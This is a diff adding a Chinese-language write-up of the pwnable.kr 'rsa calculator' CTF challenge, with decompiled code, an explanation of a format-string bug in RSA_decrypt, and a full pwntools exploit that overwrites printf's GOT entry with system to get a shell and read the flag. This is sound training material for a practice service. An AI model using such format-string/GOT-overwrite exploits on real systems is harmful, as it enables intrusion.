@@ -16304,3 +16304,316 @@ io.interactive()
 
 ------
 
+### rsa calculator
+
+这是**Pwnable.kr**的第三十五个挑战`rsa calculator`，来自**[Rookiss]**部分。
+
+```bash
+Pwn this RSA calculator service.
+its lame, but it also supports some encryption/decryption.
+
+download : http://pwnable.kr/bin/rsa_calculator
+
+Running at : nc pwnable.kr 9012
+```
+
+这题只给出一个二进制文件`rsa_calculator`，让我们下载看看文件信息。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/rsa_calculator
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./rsa_calculator  
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./rsa_calculator                    
+./rsa_calculator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5a1cac72ac92e73c1e94333486b73fdbfd558c4b, not stripped
+                                                                                                          
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./rsa_calculator
+[*] '/home/tyd/ctf/pwn/pwnable.kr/rsa_calculator'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 64bit`打开二进制文件`rsa_calculator`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v5; // [rsp+Ch] [rbp-4h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  puts("- Buggy RSA Calculator -\n");
+  func[0] = (__int64)set_key;
+  qword_602508 = (__int64)RSA_encrypt;
+  qword_602510 = (__int64)RSA_decrypt;
+  qword_602518 = (__int64)help;
+  qword_602520 = (__int64)myexit;
+  qmemcpy(&dword_602528, "pwnable.krisbest", 16);
+  qword_602538 = (__int64)system;
+  v5 = 0;
+  while ( 1 )
+  {
+    puts("\n- select menu -");
+    puts("- 1. : set key pair");
+    puts("- 2. : encrypt");
+    puts("- 3. : decrypt");
+    puts("- 4. : help");
+    puts("- 5. : exit");
+    printf("> ");
+    __isoc99_scanf("%d", &v5);
+    if ( (unsigned int)(v5 + 1) > 6 )
+      break;
+    ((void (*)(void))func[v5 - 1])();
+    if ( g_try++ > 10 )
+    {
+      puts("this is demo version");
+      exit(0);
+    }
+  }
+  puts("invalid menu");
+  return 0;
+}
+```
+
+双击`set_key()`查看详情，该函数用于设置`RSA`密钥，不过该函数并没有严格按照RSA算法的写法。首先要求用户输入两个素数 `p` 和 `q`，然后根据输入的值计算 `n` 和 `Phi`，接着要求用户输入公钥指数 `e` 和私钥指数 `d`。函数会对输入的参数进行一些检查，例如，检查 `e` 和 `d` 是否小于 `Phi`，以及 `e` 和 `d` 是否满足 `e * d mod Phi = 1`。
+
+```c
+__int64 set_key()
+{
+  unsigned int v1; // [rsp+18h] [rbp-18h] BYREF
+  unsigned int v2; // [rsp+1Ch] [rbp-14h] BYREF
+  unsigned int i; // [rsp+20h] [rbp-10h]
+  unsigned int v4; // [rsp+24h] [rbp-Ch]
+  unsigned int v5; // [rsp+28h] [rbp-8h]
+  __int16 v6; // [rsp+2Ch] [rbp-4h] BYREF
+  __int16 v7; // [rsp+2Eh] [rbp-2h] BYREF
+  // 提示用户设置RSA密钥
+  puts("-SET RSA KEY-");
+  printf("p : ");
+  __isoc99_scanf("%d", &v6);
+  printf("q : ");
+  __isoc99_scanf("%d", &v7);
+  printf("p, q, set to %d, %d\n", (unsigned int)v6, (unsigned int)v7);
+  puts("-current private key and public keys-");  // 打印当前的公钥和私钥
+  printf("public key : ");
+  for ( i = 0; i <= 7; ++i )  
+    printf("%02x ", pub[i]);
+  printf("\npublic key : ");
+  for ( i = 0; i <= 7; ++i )
+    printf("%02x ", pri[i]);
+  putchar(10);
+  v4 = v6 * v7;  // 计算n=p*q
+  v5 = (v6 - 1) * (v7 - 1);  // 计算Phi=(p-1)*(q-1)
+  printf("N set to %d, PHI set to %d\n", v4, v5);
+  printf("set public key exponent e : ");  // 提示用户输入公钥指数e
+  __isoc99_scanf("%d", &v1);
+  printf("set private key exponent d : ");  // 提示用户输入私钥指数d
+  __isoc99_scanf("%d", &v2);
+  if ( v1 < v5 && v2 < v5 && v2 * v1 % v5 != 1 )  // 检查e和d是否满足要求
+  {
+    puts("wrong parameters for key generation");
+    exit(0);
+  }
+  if ( v4 <= 0xFF )  // 检查密钥长度是否足够
+  {
+    puts("key length too short");
+    exit(0);
+  }
+  set_pub_key(v1, v4, pub);  // 设置公钥
+  set_pri_key(v2, v4, pri);  // 设置私钥
+  puts("key set ok");
+  printf("pubkey(e,n) : (%d(%08x), %d(%08x))\n", v1, v1, v4, v4);
+  printf("prikey(d,n) : (%d(%08x), %d(%08x))\n", v2, v2, v4, v4);
+  is_set = 1;
+  return 1LL;
+}
+```
+
+双击`RSA_encrypt()`函数详情，该函数接受用户输入的`ASCII`字符，使用`RSA`进行加密，然后以十六进制格式打印加密结果。
+
+```c
+__int64 RSA_encrypt()
+{
+  __int64 result; // rax
+  int v2; // eax
+  unsigned int v3; // [rsp+Ch] [rbp-1424h] BYREF
+  int v4; // [rsp+10h] [rbp-1420h]
+  int i; // [rsp+14h] [rbp-141Ch]
+  char ptr; // [rsp+1Fh] [rbp-1411h] BYREF
+  char s[4096]; // [rsp+20h] [rbp-1410h] BYREF
+  char src[1032]; // [rsp+1020h] [rbp-410h] BYREF
+  unsigned __int64 v10; // [rsp+1428h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  if ( is_set )
+  {
+    v3 = 0;
+    printf("how long is your data?(max=1024) : ");   // 提示用户输入要加密的数据的长度, 最多1024个字符
+    __isoc99_scanf("%d", &v3);
+    if ( v3 <= 0x400 )  // 小于或等于1024
+    {
+      v4 = 0;
+      fgetc(stdin);  // 清除输入缓冲区
+      puts("paste your plain text data");
+      while ( v3-- != 0 )
+      {
+        if ( !(unsigned int)fread(&ptr, 1uLL, 1uLL, stdin) )
+          exit(0);
+        if ( ptr == 10 )
+          break;
+        src[v4++] = ptr;
+      }
+      memcpy(g_pbuf, src, v4);    // 将src数组的内容复制到g_pbuf数组中
+      for ( i = 0; i < v4; ++i )  // 循环遍历g_pbuf中的每个字符
+      {
+        v2 = encrypt((unsigned int)g_pbuf[i], &pub);  // 使用encrypt函数对其进行加密
+        g_ebuf[i] = v2;  // 加密的结果存储在g_ebuf数组中
+      }
+      memset(s, 0, 0x400uLL);
+      for ( i = 0; 4 * v4 > i; ++i )  // 遍历g_ebuf数组并使用sprintf将每个字节格式化为两个字符的十六进制字符串 存于s
+        sprintf(&s[2 * i], "%02x", *((unsigned __int8 *)g_ebuf + i));
+      puts("-encrypted result (hex encoded) -");
+      puts(s);
+      result = 0LL;
+    }
+    else
+    {
+      puts("data length exceeds buffer size");
+      result = 0LL;
+    }
+  }
+  else
+  {
+    puts("set RSA key first");
+    result = 0LL;
+  }
+  return result;
+}
+```
+
+双击`RSA_decrypt()`函数详情，对输入的数据进行 RSA 解密操作，并以字符串形式打印解密结果。该函数在`printf(g_pbuf);`处存在格式化字符串漏洞，可以利用该漏洞读写内存地址。
+
+```c
+__int64 RSA_decrypt()
+{
+  __int64 result; // rax
+  char *v2; // rdx
+  char v3; // al
+  int v4; // [rsp+Ch] [rbp-634h] BYREF
+  int v5; // [rsp+10h] [rbp-630h]
+  int i; // [rsp+14h] [rbp-62Ch]
+  int v7; // [rsp+18h] [rbp-628h]
+  char v9[15]; // [rsp+20h] [rbp-620h] BYREF
+  char ptr[1025]; // [rsp+2Fh] [rbp-611h] BYREF
+  char src[520]; // [rsp+430h] [rbp-210h] BYREF
+  unsigned __int64 v12; // [rsp+638h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  if ( is_set )
+  {
+    v4 = 0;
+    printf("how long is your data?(max=1024) : ");
+    __isoc99_scanf("%d", &v4);
+    if ( v4 <= 1024 )
+    {
+      v5 = 0;
+      fgetc(stdin);
+      puts("paste your hex encoded data");
+      while ( v4-- != 0 )
+      {
+        if ( !(unsigned int)fread(ptr, 1uLL, 1uLL, stdin) )
+          exit(0);
+        if ( ptr[0] == 10 )
+          break;
+        ptr[++v5] = ptr[0];
+      }
+      memset(src, 0, 0x200uLL);
+      i = 0;
+      v7 = 0;
+      while ( 2 * v5 > i )  // 将十六进制编码的数据转换为二进制形式并存储在src数组中
+      {
+        v9[0] = ptr[i + 1];
+        v9[1] = ptr[i + 2];
+        v9[2] = 0;
+        v2 = &src[v7++];
+        __isoc99_sscanf(v9, "%02x", v2);
+        i += 2;
+      }
+      memcpy(g_ebuf, src, v5);  // 将转换后的数据复制到g_ebuf数组中
+      for ( i = 0; v5 / 8 > i; ++i )  // 对g_ebuf数组中的每个字节进行解密操作并存储在g_pbuf数组中
+      {
+        v3 = decrypt((unsigned int)g_ebuf[i], &pri);
+        g_pbuf[i] = v3;
+      }
+      g_pbuf[i] = 0;
+      puts("- decrypted result -");
+      printf(g_pbuf);  // 存在格式化字符串漏洞
+      putchar(10);
+      result = 0LL;
+    }
+    else
+    {
+      puts("data length exceeds buffer size");
+      result = 0LL;
+    }
+  }
+  else
+  {
+    puts("set RSA key first");
+    result = 0LL;
+  }
+  return result;
+}
+```
+
+编写`Python`代码求解，随便设置`p`，`q`，`e`，`d`，利用格式化字符串漏洞，修改GOT表中的`printf`为`system`后再将`"/bin/sh"`写入到`g_pbuf`就能获得`shell`，之后得到`flag`：`what a stupid buggy rsa calculator! :(`。
+
+```python
+from pwn import *
+
+io = remote('pwnable.kr', 9012)
+def set_key(p: int, q: int, e: int, d: int):
+    io.recvuntil(b'exit\n')
+    io.sendline(b'1')
+    io.sendlineafter(b'p : ', str(p).encode())
+    io.sendlineafter(b'q : ', str(q).encode())
+    io.sendlineafter(b'e : ', str(e).encode())
+    io.sendlineafter(b'd : ', str(d).encode())
+
+# def encrypt(s: str) -> bytes
+encrypt = lambda s: "".join(format(ord(i), "0x").ljust(8, "0") for i in s).encode()   
+def decrypt(msg: bytes):
+    io.recvuntil(b'exit\n')
+    io.sendline(b'3')
+    try:
+        io.recvuntil(b' : ', timeout=2)
+    except pwnlib.exception.TimeoutException:
+        print("Timeout occurred")
+    io.sendline(b'-1')
+    io.recvline()
+    io.sendline(msg)
+
+
+elf = ELF('./rsa_calculator')
+printf_got = elf.got["printf"]
+p, q, e, d = 100, 100, 1, 1
+set_key(p,q,e,d)
+decrypt(encrypt("a" * 40) + p64(printf_got + 4) + p64(printf_got + 2) + p64(printf_got))
+decrypt(encrypt("%52$n%64c%53$hn%1920c%54$hn"))
+decrypt(encrypt("/bin/sh"))
+# io.interactive() # or
+io.sendlineafter(b'- decrypted result -\n', b'cat flag')
+log.success(f"Flag: {term.text.bold_italic_yellow(io.recvline().decode().strip())}")
+io.close()
+```
+
+------
+
